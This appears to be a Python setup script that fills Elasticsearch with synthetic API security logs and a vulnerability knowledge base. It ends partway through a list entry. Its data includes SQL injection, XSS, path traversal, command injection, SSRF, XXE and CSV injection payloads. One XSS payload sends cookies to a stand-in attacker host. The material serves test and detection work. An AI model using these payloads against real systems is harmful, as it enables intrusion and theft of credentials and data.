import base64

from elasticsearch import Elasticsearch
from datetime import datetime, timedelta
import random
import logging
import json
import uuid
from urllib.parse import urlencode
import hashlib

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class ElasticsearchSetup:
    def __init__(self):
        self.es = Elasticsearch(['http://elasticsearch:9200'])
        self.api_logs_index = 'api_security_logs'
        self.knowledge_base_index = 'security_knowledge_base'

        # Sample endpoints with various API patterns
        self.sample_endpoints = [
            "https://api.example.com/users",
            "https://api.example.com/auth/login",
            "https://api.example.com/auth/register",
            "https://api.example.com/products",
            "https://api.example.com/orders",
            "https://api.example.com/payments",
            "https://api.example.com/inventory",
            "https://api.example.com/analytics",
            "https://api.example.com/webhooks",
            "https://api.example.com/oauth/token",
            "https://jsonplaceholder.typicode.com/users",
            "https://jsonplaceholder.typicode.com/posts"
        ]

        # User agents for realistic request simulation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "PostmanRuntime/7.28.4",
            "curl/7.64.1",
            "Python-urllib/3.8",
            "Apache-HttpClient/4.5.13",
            "burp/2.0",
            "zgrab/0.x",
            "Nmap Scripting Engine",
            "nikto/2.1.6"
        ]

        # Sample IP addresses including malicious ones
        # Fixed sample IP addresses
        self.ip_addresses = [
            "192.168.1.100",
            "10.0.0.50",
            "203.0.113.45",
            "1.2.3.4",
            "45.33.22.11",
            "185.143.223.100",
            "62.233.50.123",
            "172.16.0.100",
            "8.8.8.8",
            "198.51.100.1"
        ]

        # Sample user data
        self.users = [
            {"first_name": "John", "last_name": "Smith", "role": "admin"},
            {"first_name": "Emma", "last_name": "Johnson", "role": "user"},
            {"first_name": "Michael", "last_name": "Brown", "role": "guest"},
            {"first_name": "admin", "last_name": "' OR '1'='1", "role": "attacker"},
            {"first_name": "<script>", "last_name": "alert(1)</script>", "role": "attacker"}
        ]

    def create_indices(self):
        """Create indices with proper mappings"""
        # API Logs Index Mapping
        api_logs_mapping = {
            "mappings": {
                "properties": {
                    "timestamp": {"type": "date"},
                    "endpoint": {"type": "keyword"},
                    "method": {"type": "keyword"},
                    "client_info": {
                        "properties": {
                            "ip_address": {"type": "ip"},
                            "user_agent": {"type": "keyword"},
                            "geo_location": {
                                "properties": {
                                    "country": {"type": "keyword"},
                                    "city": {"type": "keyword"},
                                    "coordinates": {"type": "geo_point"}
                                }
                            }
                        }
                    },
                    "request": {
                        "properties": {
                            "headers": {"type": "object"},
                            "body": {"type": "object"},
                            "params": {"type": "object"},
                            "uri": {"type": "keyword"}
                        }
                    },
                    "response": {
                        "properties": {
                            "status_code": {"type": "integer"},
                            "headers": {"type": "object"},
                            "body": {"type": "object"},
                            "response_time": {"type": "float"}
                        }
                    },
                    "security_context": {
                        "properties": {
                            "risk_score": {"type": "float"},
                            "threat_level": {"type": "keyword"},
                            "vulnerability_types": {"type": "keyword"},
                            "attack_vectors": {"type": "keyword"},
                            "authentication": {
                                "properties": {
                                    "method": {"type": "keyword"},
                                    "success": {"type": "boolean"},
                                    "failure_reason": {"type": "keyword"}
                                }
                            }
                        }
                    },
                    "performance_metrics": {
                        "properties": {
                            "response_time": {"type": "float"},
                            "cpu_usage": {"type": "float"},
                            "memory_usage": {"type": "float"},
                            "concurrent_requests": {"type": "integer"}
                        }
                    }
                }
            }
        }

        # Create indices
        for index, mapping in [
            (self.api_logs_index, api_logs_mapping),
            (self.knowledge_base_index, self.get_knowledge_base_mapping())
        ]:
            if not self.es.indices.exists(index=index):
                self.es.indices.create(index=index, body=mapping)
                logger.info(f"Created index: {index}")

    def get_knowledge_base_mapping(self):
        """Creating knowledge base mapping with detailed security patterns"""
        return {
            "mappings": {
                "properties": {
                    "category": {"type": "keyword"},
                    "vulnerability_type": {"type": "keyword"},
                    "test_pattern": {"type": "text"},
                    "payload": {"type": "text"},
                    "expected_response": {"type": "text"},
                    "remediation": {"type": "text"},
                    "risk_level": {"type": "keyword"},
                    "metadata": {
                        "properties": {
                            "cwe_id": {"type": "keyword"},
                            "owasp_category": {"type": "keyword"},
                            "cvss_score": {"type": "float"},
                            "affected_components": {"type": "keyword"},
                            "related_vulnerabilities": {"type": "keyword"}
                        }
                    },
                    "detection": {
                        "properties": {
                            "patterns": {"type": "keyword"},
                            "indicators": {"type": "keyword"},
                            "false_positives": {"type": "text"}
                        }
                    },
                    "mitigation": {
                        "properties": {
                            "immediate_actions": {"type": "text"},
                            "long_term_fixes": {"type": "text"},
                            "security_controls": {"type": "keyword"}
                        }
                    }
                }
            }
        }

    def generate_attack_scenarios(self):
        """Generating various attack scenarios for testing"""
        return [
            {
                "name": "SQL Injection Attack",
                "payloads": [
                    "' OR '1'='1",
                    "'; DROP TABLE users--",
                    "' UNION SELECT username,password FROM users--",
                    "admin'--",
                    "1' ORDER BY 10--",
                    "1'; WAITFOR DELAY '0:0:10'--"
                ],
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": random.choice(self.user_agents)
                }
            },
            {
                "name": "XSS Attack",
                "payloads": [
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert(1)",
                    "<svg/onload=alert(1)>",
                    "'-alert(1)-'",
                    "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
                ],
                "headers": {
                    "Content-Type": "text/html",
                    "User-Agent": random.choice(self.user_agents)
                }
            },
            {
                "name": "JWT Attack",
                "payloads": [
                    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
                    "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
                    "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
                ],
                "headers": {
                    "Authorization": "Bearer {payload}",
                    "Content-Type": "application/json"
                }
            },
            {
                "name": "Path Traversal",
                "payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "....//....//....//etc/passwd",
                    "/var/www/../../etc/passwd",
                    "../../../../etc/shadow%00"
                ],
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            },
            {
                "name": "Command Injection",
                "payloads": [
                    "; cat /etc/passwd",
                    "| pwd",
                    "`whoami`",
                    "$(ls -la)",
                    "& net user",
                    "; ping -c 10 127.0.0.1"
                ],
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            },
            {
                "name": "SSRF Attack",
                "payloads": [
                    "http://localhost:8080/admin",
                    "http://169.254.169.254/latest/meta-data/",
                    "http://127.0.0.1:22",
                    "file:///etc/passwd",
                    "dict://attacker:11111",
                    "gopher://127.0.0.1:6379/_SET%20mykey%20%22myvalue%22"
                ],
                "headers": {
                    "Content-Type": "application/json"
                }
            }
        ]

    def generate_security_events(self):
        """Generating security-related events"""
        return [
            {
                "type": "Authentication Failure",
                "description": "Multiple failed login attempts",
                "severity": "High",
                "source_ip": random.choice(self.ip_addresses),
                "timestamp": datetime.now() - timedelta(minutes=random.randint(1, 60))
            },
            {
                "type": "Suspicious Activity",
                "description": "Unusual access pattern detected",
                "severity": "Medium",
                "source_ip": random.choice(self.ip_addresses),
                "timestamp": datetime.now() - timedelta(minutes=random.randint(1, 60))
            },
            {
                "type": "Rate Limit Exceeded",
                "description": "API rate limit threshold breached",
                "severity": "Low",
                "source_ip": random.choice(self.ip_addresses),
                "timestamp": datetime.now() - timedelta(minutes=random.randint(1, 60))
            }
        ]

    def _generate_api_logs(self, num_records=50):
        """Generating API logs with security patterns and attack scenarios"""
        attack_scenarios = self.generate_attack_scenarios()
        security_events = self.generate_security_events()

        for _ in range(num_records):
            # Select random scenario and event
            scenario = random.choice(attack_scenarios)
            security_event = random.choice(security_events)
            is_attack = random.random() < 0.3  # 30% chance of being an attack

            # Generate timestamp with realistic distribution
            timestamp = datetime.now() - timedelta(
                days=random.randint(0, 30),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )

            # Selecting endpoint and method
            endpoint = random.choice(self.sample_endpoints)
            method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"])

            # Generating base document
            doc = {
                "timestamp": timestamp.isoformat(),
                "endpoint": endpoint,
                "method": method,
                "client_info": {
                    "ip_address": security_event["source_ip"],
                    "user_agent": random.choice(self.user_agents),
                    "geo_location": self._generate_geo_location()
                },
                "request": self._generate_request(scenario, is_attack, endpoint),
                "response": self._generate_response(is_attack),
                "security_context": self._generate_security_context(
                    scenario, security_event, is_attack
                ),
                "performance_metrics": self._generate_performance_metrics()
            }

            self.es.index(index=self.api_logs_index, document=doc)

    def _generate_request(self, scenario, is_attack, endpoint=None):
        """Generating request data based on scenario"""
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Request-ID": str(uuid.uuid4()),
            "User-Agent": random.choice(self.user_agents)
        }

        # Adding authentication headers
        if random.random() < 0.7:  # 70% chance of having auth
            headers["Authorization"] = f"Bearer {self._generate_jwt_token()}"
            headers["X-API-Key"] = f"key_{uuid.uuid4().hex[:8]}"

        # Adding attack payload if it's an attack scenario
        params = {}
        body = {}
        if is_attack:
            payload = random.choice(scenario["payloads"])
            if scenario["name"] == "SQL Injection Attack":
                params["id"] = payload
            elif scenario["name"] == "XSS Attack":
                params["name"] = payload
            elif scenario["name"] == "Path Traversal":
                params["file"] = payload
            body = {"input": payload}

        # Use the provided endpoint instead of choosing randomly
        uri_endpoint = endpoint if endpoint else random.choice(self.sample_endpoints)

        return {
            "headers": headers,
            "params": params,
            "body": body,
            "uri": f"{uri_endpoint}?{urlencode(params)}"
        }

    def _generate_response(self, is_attack):
        """Generating response based on whether it's an attack"""
        if is_attack:
            status_code = random.choice([400, 401, 403, 429, 500])
            body = {
                "error": {
                    "code": f"SEC_{status_code}",
                    "message": self._get_error_message(status_code),
                    "request_id": str(uuid.uuid4()),
                    "timestamp": datetime.now().isoformat()
                }
            }
        else:
            status_code = random.choice([200, 201, 204])
            body = {
                "success": True,
                "data": self._generate_success_data(),
                "metadata": {
                    "timestamp": datetime.now().isoformat(),
                    "version": "1.0"
                }
            }

        return {
            "status_code": status_code,
            "headers": self._generate_security_headers(),
            "body": body,
            "response_time": random.uniform(0.1, 2.0)
        }

    def _generate_security_context(self, scenario, security_event, is_attack):
        """Generating security context information"""
        risk_score = random.uniform(0.8, 1.0) if is_attack else random.uniform(0.1, 0.3)

        return {
            "risk_score": risk_score,
            "threat_level": "High" if is_attack else "Low",
            "vulnerability_types": [scenario["name"]],
            "attack_vectors": [security_event["type"]],
            "authentication": {
                "method": "JWT" if "Authorization" in scenario.get("headers", {}) else "None",
                "success": not is_attack,
                "failure_reason": "Invalid token" if is_attack else None
            },
            "detection": {
                "confidence": random.uniform(0.7, 1.0) if is_attack else random.uniform(0.1, 0.3),
                "rules_triggered": self._generate_security_rules(scenario["name"]),
                "mitigation_applied": not is_attack
            }
        }

    def _generate_security_rules(self, attack_type):
        """Generating security rules that were triggered"""
        rules = {
            "SQL Injection Attack": [
                "SQL_INJECTION_PATTERN_MATCH",
                "SUSPICIOUS_SQL_CHARS",
                "UNION_SELECT_DETECTED"
            ],
            "XSS Attack": [
                "XSS_SCRIPT_TAG_DETECTED",
                "HTML_INJECTION_ATTEMPT",
                "SUSPICIOUS_JS_FUNCTIONS"
            ],
            "JWT Attack": [
                "JWT_ALGORITHM_MANIPULATION",
                "TOKEN_TAMPERING_DETECTED",
                "INVALID_SIGNATURE"
            ],
            "Path Traversal": [
                "DIRECTORY_TRAVERSAL_ATTEMPT",
                "SUSPICIOUS_PATH_SEQUENCE",
                "FILE_ACCESS_VIOLATION"
            ],
            "SSRF Attack": [
                "INTERNAL_IP_ACCESS_ATTEMPT",
                "BLOCKED_URL_SCHEME",
                "METADATA_ACCESS_ATTEMPT"
            ]
        }
        return rules.get(attack_type, ["GENERIC_ATTACK_DETECTED"])

    def _generate_jwt_token(self):
        """Generating sample JWT tokens"""
        headers = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "HS256", "typ": "JWT"},
            {"alg": "RS256", "typ": "JWT"}
        ]
        payloads = [
            {"sub": "user123", "role": "user", "exp": int((datetime.now() + timedelta(hours=1)).timestamp())},
            {"sub": "admin", "role": "admin", "exp": int((datetime.now() - timedelta(hours=1)).timestamp())},
            {"sub": "attacker", "role": "admin'--", "exp": int(datetime.now().timestamp())}
        ]

        header = random.choice(headers)
        payload = random.choice(payloads)

        # Simulate JWT structure (not actual encryption)
        token_parts = [
            base64.b64encode(json.dumps(header).encode()).decode(),
            base64.b64encode(json.dumps(payload).encode()).decode(),
            hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest()[:32]
        ]
        return '.'.join(token_parts)

    def _generate_geo_location(self):
        """Generate realistic geo-location data"""
        locations = [
            {"country": "US", "city": "New York", "coordinates": [-74.006, 40.7128]},
            {"country": "GB", "city": "London", "coordinates": [-0.1276, 51.5074]},
            {"country": "RU", "city": "Moscow", "coordinates": [37.6173, 55.7558]},
            {"country": "CN", "city": "Beijing", "coordinates": [116.4074, 39.9042]}
        ]
        return random.choice(locations)

    def _generate_performance_metrics(self):
        """Generate performance-related metrics"""
        return {
            "response_time": random.uniform(0.05, 2.0),
            "cpu_usage": random.uniform(20, 80),
            "memory_usage": random.uniform(100, 500),
            "concurrent_requests": random.randint(1, 100)
        }

    def _get_error_message(self, status_code):
        """Get appropriate error message based on status code"""
        messages = {
            400: "Invalid request payload detected",
            401: "Authentication required",
            403: "Insufficient permissions",
            404: "Resource not found",
            429: "Too many requests",
            500: "Internal server error"
        }
        return messages.get(status_code, "Unknown error occurred")

    def _generate_success_data(self):
        """Generate success response data"""
        data_types = [
            {
                "id": random.randint(1000, 9999),
                "username": f"user_{random.randint(1000, 9999)}",
                "email": f"user{random.randint(1000, 9999)}@example.com",
                "status": random.choice(["active", "inactive", "pending"])
            },
            {
                "order_id": f"ORD-{random.randint(10000, 99999)}",
                "total_amount": round(random.uniform(10, 1000), 2),
                "status": random.choice(["pending", "completed", "failed"])
            },
            {
                "transaction_id": f"TXN-{random.randint(10000, 99999)}",
                "amount": round(random.uniform(10, 1000), 2),
                "currency": random.choice(["USD", "EUR", "GBP"])
            }
        ]
        return random.choice(data_types)

    def _generate_security_headers(self):
        """Generate security response headers"""
        headers = {
            "Content-Type": "application/json",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=()",
            "Cache-Control": "no-store, must-revalidate, max-age=0"
        }

        # Add rate limiting headers
        if random.random() < 0.8:  # 80% chance of having rate limit headers
            headers.update({
                "X-RateLimit-Limit": str(random.choice([60, 100, 1000])),
                "X-RateLimit-Remaining": str(random.randint(0, 100)),
                "X-RateLimit-Reset": str(int((datetime.now() + timedelta(hours=1)).timestamp()))
            })

        # Add correlation ID
        headers["X-Request-ID"] = str(uuid.uuid4())

        # Add server timing metrics
        headers["Server-Timing"] = f"app;dur={random.uniform(0.1, 2.0)}, db;dur={random.uniform(0.05, 1.0)}"

        return headers

    def run(self):
        """Main execution function"""
        try:
            logger.info("Starting Elasticsearch setup...")

            # Create indices
            self.create_indices()
            logger.info("Indices created successfully")

            # Generate API logs with security patterns
            self._generate_api_logs(num_records=1000)
            logger.info("Generated API logs with security patterns")

            # Setup knowledge base
            self.setup_knowledge_base()
            logger.info("Knowledge base populated with security patterns")

            logger.info("Setup completed successfully")

        except Exception as e:
            logger.error(f"Error during setup: {str(e)}")
            raise


    def setup_knowledge_base(self):
        security_patterns = [
            {
                "category": "Authentication",
                "vulnerability_type": "JWT Token",
                "test_pattern": "Test JWT token validation",
                "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement proper JWT validation and use strong secret keys",
                "risk_level": "Critical"
            },
            {
                "category": "Injection",
                "vulnerability_type": "SQL Injection",
                "test_pattern": "Test SQL injection in parameters",
                "payload": "' OR '1'='1",
                "expected_response": "400 Bad Request",
                "remediation": "Use parameterized queries and input validation",
                "risk_level": "Critical"
            },
            {
                "category": "Rate Limiting",
                "vulnerability_type": "API Rate Limit",
                "test_pattern": "Test rate limiting implementation",
                "payload": "Multiple rapid requests",
                "expected_response": "429 Too Many Requests",
                "remediation": "Implement rate limiting with Redis/token bucket",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Weak Password Policy",
                "test_pattern": "Test password complexity requirements",
                "payload": "password123",
                "expected_response": "400 Bad Request",
                "remediation": "Enforce strong password policies (min length, complexity)",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Cross-Site Scripting (XSS)",
                "test_pattern": "Test XSS in input fields",
                "payload": "<script>alert('XSS')</script>",
                "expected_response": "400 Bad Request",
                "remediation": "Implement output encoding and input sanitization",
                "risk_level": "Critical"
            },
            {
                "category": "Authorization",
                "vulnerability_type": "Horizontal Privilege Escalation",
                "test_pattern": "Attempt to access another user's resources",
                "payload": "Modify user ID in request",
                "expected_response": "403 Forbidden",
                "remediation": "Implement strict role-based access control",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Encryption",
                "test_pattern": "Test encryption key strength",
                "payload": "Attempt to use short/weak encryption keys",
                "expected_response": "400 Bad Request",
                "remediation": "Use strong encryption algorithms (AES-256, RSA-2048)",
                "risk_level": "High"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Session Fixation",
                "test_pattern": "Test session token generation",
                "payload": "Reuse existing session token",
                "expected_response": "401 Unauthorized",
                "remediation": "Regenerate session tokens after authentication",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Command Injection",
                "test_pattern": "Test OS command injection",
                "payload": ";ls -la",
                "expected_response": "400 Bad Request",
                "remediation": "Use input validation and avoid shell command execution",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Brute Force Protection",
                "test_pattern": "Test multiple login attempts",
                "payload": "Multiple consecutive login failures",
                "expected_response": "429 Too Many Requests",
                "remediation": "Implement account lockout and CAPTCHA",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Path Traversal",
                "test_pattern": "Test directory traversal in file paths",
                "payload": "../../../etc/passwd",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and sanitize file path inputs",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Insecure Direct Object Reference (IDOR)",
                "test_pattern": "Attempt to access unauthorized resources",
                "payload": "Manipulate resource ID in request",
                "expected_response": "403 Forbidden",
                "remediation": "Implement server-side access controls",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Open Redirect",
                "test_pattern": "Test redirect parameter manipulation",
                "payload": "https://malicious-site.com",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and whitelist redirect URLs",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Insufficient Entropy",
                "test_pattern": "Test randomness of generated tokens",
                "payload": "Check token generation mechanism",
                "expected_response": "Cryptographically strong tokens",
                "remediation": "Use cryptographically secure random number generators",
                "risk_level": "Medium"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Unnecessary HTTP Methods",
                "test_pattern": "Test unnecessary HTTP methods",
                "payload": "TRACE, TRACK methods",
                "expected_response": "405 Method Not Allowed",
                "remediation": "Disable unnecessary HTTP methods",
                "risk_level": "Low"
            },
            {
                "category": "Injection",
                "vulnerability_type": "NoSQL Injection",
                "test_pattern": "Test NoSQL database injection",
                "payload": "{'$ne': null}",
                "expected_response": "400 Bad Request",
                "remediation": "Use parameterized queries and input validation",
                "risk_level": "High"
            },
            {
                "category": "Logging",
                "vulnerability_type": "Sensitive Data Logging",
                "test_pattern": "Check for sensitive data in logs",
                "payload": "Attempt to log passwords or tokens",
                "expected_response": "Sanitized log entries",
                "remediation": "Remove sensitive data from logs",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Lack of HTTPS",
                "test_pattern": "Test HTTP vs HTTPS endpoints",
                "payload": "HTTP endpoint access",
                "expected_response": "Redirect to HTTPS or 403",
                "remediation": "Enforce HTTPS for all endpoints",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Default Credentials",
                "test_pattern": "Test default/common credentials",
                "payload": "admin/admin, root/root",
                "expected_response": "401 Unauthorized",
                "remediation": "Enforce strong initial password change",
                "risk_level": "Critical"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "XML External Entity (XXE)",
                "test_pattern": "Test XML parsing vulnerability",
                "payload": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
                "expected_response": "400 Bad Request",
                "remediation": "Disable XML external entity processing",
                "risk_level": "Critical"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Two-Factor Authentication Bypass",
                "test_pattern": "Test 2FA implementation",
                "payload": "Bypass 2FA verification",
                "expected_response": "401 Unauthorized",
                "remediation": "Enforce strict 2FA validation",
                "risk_level": "Critical"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Verbose Error Messages",
                "test_pattern": "Test detailed error responses",
                "payload": "Trigger various error conditions",
                "expected_response": "Generic error messages",
                "remediation": "Implement generic error responses",
                "risk_level": "Low"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Session Timeout",
                "test_pattern": "Test session expiration",
                "payload": "Attempt to use expired session",
                "expected_response": "401 Unauthorized",
                "remediation": "Implement strict session timeout",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "LDAP Injection",
                "test_pattern": "Test LDAP query manipulation",
                "payload": "*)(&",
                "expected_response": "400 Bad Request",
                "remediation": "Use LDAP query parameterization",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Excessive Data Exposure",
                "test_pattern": "Test API response data",
                "payload": "Request unnecessary data fields",
                "expected_response": "Limited response fields",
                "remediation": "Implement field-level access control",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Weak Token Generation",
                "test_pattern": "Test token predictability",
                "payload": "Check token generation algorithm",
                "expected_response": "Unpredictable tokens",
                "remediation": "Use cryptographically secure token generation",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                "test_pattern": "Test internal resource access",
                "payload": "http://localhost/admin",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and whitelist URL schemas",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Password Reset Vulnerability",
                "test_pattern": "Test password reset mechanism",
                "payload": "Manipulate password reset token",
                "expected_response": "Secure token generation and verification",
                "remediation": "Implement time-limited, single-use reset tokens",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Insecure Randomness",
                "test_pattern": "Test random number generation",
                "payload": "Predict random values",
                "expected_response": "Cryptographically secure random generation",
                "remediation": "Use SecureRandom or cryptographically secure PRNGs",
                "risk_level": "Medium"
            },
            {
                "category": "Authorization",
                "vulnerability_type": "Vertical Privilege Escalation",
                "test_pattern": "Attempt to access admin functionalities",
                "payload": "Modify user role in request",
                "expected_response": "403 Forbidden",
                "remediation": "Implement strict role-based access control (RBAC)",
                "risk_level": "Critical"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "HTML Injection",
                "test_pattern": "Test HTML injection in input fields",
                "payload": "<html>Malicious Content</html>",
                "expected_response": "400 Bad Request",
                "remediation": "Implement output encoding and input sanitization",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "GraphQL Introspection",
                "test_pattern": "Test GraphQL endpoint exposure",
                "payload": "Introspection query to reveal schema",
                "expected_response": "Limited schema exposure",
                "remediation": "Disable introspection in production",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Email Injection",
                "test_pattern": "Test email parameter manipulation",
                "payload": "test@example.com\r\nCC: attacker@malicious.com",
                "expected_response": "400 Bad Request",
                "remediation": "Validate and sanitize email inputs",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Security Misconfiguration",
                "test_pattern": "Test default configuration",
                "payload": "Check for open debug modes",
                "expected_response": "Secure default configuration",
                "remediation": "Implement secure default settings",
                "risk_level": "Medium"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "OAuth Token Hijacking",
                "test_pattern": "Test OAuth token validation",
                "payload": "Intercept and reuse OAuth tokens",
                "expected_response": "Token invalidation",
                "remediation": "Implement token binding and short-lived tokens",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "JSON Injection",
                "test_pattern": "Test JSON parsing vulnerability",
                "payload": "{\"key\":\"value\\\"}}{\"injected\":\"payload\"}",
                "expected_response": "400 Bad Request",
                "remediation": "Use strict JSON parsing with schema validation",
                "risk_level": "High"
            },
            {
                "category": "Logging",
                "vulnerability_type": "Log Injection",
                "test_pattern": "Test log manipulation",
                "payload": "Log entry with newline characters",
                "expected_response": "Sanitized log entries",
                "remediation": "Sanitize log inputs and use structured logging",
                "risk_level": "Low"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Cookie Manipulation",
                "test_pattern": "Test cookie attribute manipulation",
                "payload": "Modify secure/httpOnly cookie flags",
                "expected_response": "Secure cookie handling",
                "remediation": "Set secure and httpOnly cookie flags",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Insecure API Versioning",
                "test_pattern": "Test deprecated API version access",
                "payload": "Access outdated API endpoints",
                "expected_response": "Version deprecation or forced upgrade",
                "remediation": "Implement API version deprecation strategy",
                "risk_level": "Low"
            },
            {
                "category": "Injection",
                "vulnerability_type": "Template Injection",
                "test_pattern": "Test server-side template injection",
                "payload": "{{7*7}}",
                "expected_response": "400 Bad Request",
                "remediation": "Use safe template rendering libraries",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Account Enumeration",
                "test_pattern": "Test login error messages",
                "payload": "Attempt logins with various usernames",
                "expected_response": "Generic error messages",
                "remediation": "Use generic error messages for login attempts",
                "risk_level": "Medium"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Hashing",
                "test_pattern": "Test password hashing algorithm",
                "payload": "Check for MD5 or weak hash usage",
                "expected_response": "Use of strong hashing algorithms",
                "remediation": "Use bcrypt, Argon2, or PBKDF2 with high work factor",
                "risk_level": "High"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Unicode Normalization",
                "test_pattern": "Test Unicode character manipulation",
                "payload": "Bypass authentication with Unicode variants",
                "expected_response": "Consistent character handling",
                "remediation": "Normalize Unicode inputs before processing",
                "risk_level": "Medium"
            },
            {
                "category": "API Security",
                "vulnerability_type": "Mass Assignment",
                "test_pattern": "Test object property binding",
                "payload": "Attempt to modify protected fields",
                "expected_response": "400 Bad Request",
                "remediation": "Implement strict property whitelisting",
                "risk_level": "High"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Unprotected Actuator Endpoints",
                "test_pattern": "Test exposed management interfaces",
                "payload": "Access to system health/metrics endpoints",
                "expected_response": "Restricted access",
                "remediation": "Secure or disable management endpoints",
                "risk_level": "Medium"
            },
            {
                "category": "Injection",
                "vulnerability_type": "gRPC Injection",
                "test_pattern": "Test gRPC endpoint manipulation",
                "payload": "Malformed gRPC request",
                "expected_response": "400 Bad Request",
                "remediation": "Implement strict gRPC request validation",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "Weak Password Recovery",
                "test_pattern": "Test password recovery mechanism",
                "payload": "Exploit weak security questions",
                "expected_response": "Secure recovery process",
                "remediation": "Implement multi-factor password recovery",
                "risk_level": "Medium"
            },
            {
                "category": "Session Management",
                "vulnerability_type": "Client-Side Session Storage",
                "test_pattern": "Test client-side session handling",
                "payload": "Manipulate client-side session data",
                "expected_response": "Server-side session validation",
                "remediation": "Use server-side session management",
                "risk_level": "High"
            },
            {
                "category": "API Security",
                "vulnerability_type": "WebSocket Security Weakness",
                "test_pattern": "Test WebSocket connection security",
                "payload": "Attempt unauthorized WebSocket connection",
                "expected_response": "Connection rejected",
                "remediation": "Implement proper WebSocket authentication and authorization",
                "risk_level": "High"
            },
            {
                "category": "Cryptography",
                "vulnerability_type": "Weak Key Exchange",
                "test_pattern": "Test cryptographic key exchange",
                "payload": "Analyze key exchange mechanism",
                "expected_response": "Secure key negotiation",
                "remediation": "Use modern key exchange protocols (ECDHE, DH)",
                "risk_level": "High"
            },
            {
                "category": "Authentication",
                "vulnerability_type": "OAuth Scope Escalation",
                "test_pattern": "Test OAuth scope manipulation",
                "payload": "Attempt to expand OAuth token permissions",
                "expected_response": "Scope validation failure",
                "remediation": "Implement strict OAuth scope validation",
                "risk_level": "Critical"
            },
            {
                "category": "Input Validation",
                "vulnerability_type": "Prototype Pollution",
                "test_pattern": "Test object prototype manipulation",
                "payload": "{\"__proto__\": {\"polluted\": true}}",
                "expected_response": "400 Bad Request",
                "remediation": "Implement deep object cloning and input sanitization",
                "risk_level": "High"
            },
            {
                "category": "Injection",
                "vulnerability_type": "CSV Injection",
                "test_pattern": "Test CSV export functionality",
                "payload": "=cmd|' /C calc'!A0",
                "expected_response": "400 Bad Request",
                "remediation": "Sanitize input before CSV generation",
                "risk_level": "Medium"
            },
            {
                "category": "Configuration",
                "vulnerability_type": "Misconfigured CORS",
